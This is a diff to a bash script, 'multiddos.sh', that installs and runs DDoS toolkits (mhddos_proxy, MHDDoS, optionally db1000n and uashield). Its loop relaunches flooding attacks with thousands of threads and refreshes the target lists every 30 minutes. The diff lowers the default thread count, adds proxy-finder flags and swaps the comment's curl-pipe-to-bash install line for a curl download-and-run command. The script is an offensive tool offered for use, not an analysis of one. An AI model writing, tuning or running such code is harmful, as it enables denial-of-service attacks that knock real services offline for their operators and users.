@@ -1,5 +1,5 @@
 #!/bin/bash
-# curl -L tiny.one/multiddos | bash && tmux a
+# curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh && tmux a
 
 clear && echo -e "Loading...\n"
 
@@ -34,7 +34,7 @@ if [[ $docker_mode != "true" ]]; then
 fi
 
 if [[ $t_set_manual != "on" ]]; then
-    export threads="-t 3000"
+    export threads="-t 250"
 fi
 export proxy_threads="1000"
 export methods="--http-methods GET STRESS"
@@ -145,12 +145,14 @@ fi
 usage () {
 cat << EOF
 usage: bash multiddos.sh [+d|+u|-t|+m|-h]
-                          -g | --gotop        - disable gotop
-                          +d | --db1000n      - enable db1000n
-                          +u | --uashield     - enable uashield
-                          +v | --vnstat       - enable vnstat -l (traffic monitoring)
-                          -t | --threads      - threads
-                          -h | --help         - brings up this menu
+                    -g | --gotop            - disable gotop
+                    -p | --proxy-threads    - threads for proxy finder
+                    -p0| --no-proxy-finder  - disable proxy finder
+                    +d | --db1000n          - enable db1000n
+                    +u | --uashield         - enable uashield
+                    +v | --vnstat           - enable vnstat -l (traffic stat)
+                    -t | --threads          - threads
+                    -h | --help             - brings up this menu
 EOF
 exit
 }
@@ -164,6 +166,8 @@ while [ "$1" != "" ]; do
         -t | --threads )   export threads="-t $2"; t_set_manual="on"; shift 2 ;;
         -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
+        -p0| --no-proxy-finder ) export proxy_finder="off"; shift ;;
+        -p | --proxy-threads) export proxy_threads="$2"; shift 2 ;;
         -h | --help )    usage;   exit ;;
         *  )   usage;   exit ;;
     esac
@@ -198,13 +202,14 @@ git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 git clone https://github.com/MHProDev/MHDDoS.git
+pip uninstall -y uvloop
 
 # Restart attacks and update targets every 30 minutes
 while true; do
 echo "threads: "$threads; echo "methods: "$methods
         pkill -f start.py; pkill -f runner.py 
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
-        sleep 5 # to decrease load on cpu during simultaneous start
+        sleep 10 # to decrease load on cpu during simultaneous start
         python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
